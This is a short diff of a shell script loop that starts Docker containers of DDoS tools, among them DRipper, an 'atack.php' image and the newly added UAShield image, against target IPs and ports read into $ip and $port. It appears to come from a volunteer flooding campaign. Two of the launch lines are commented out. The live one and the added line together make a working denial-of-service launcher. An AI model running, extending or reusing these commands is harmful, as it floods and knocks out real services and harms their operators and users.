@@ -15,6 +15,7 @@ do
 #	/usr/bin/docker run -d alexmon1989/dripper:latest -s $ip -p $port -t 500 -m $proto > docker.list
 #	/usr/bin/docker run -d cherniavsky94/stop-war python3 DRipper.py -s $ip -p $port -t 443 -q 10000 > docker.list
 	/usr/bin/docker run -d angello2docker/atack.php >> docker.list
+	/usr/bin/docker run -d ghcr.io/opengs/uashield:0.0.x 1024 true  >> docker.list
     fi
 done
 
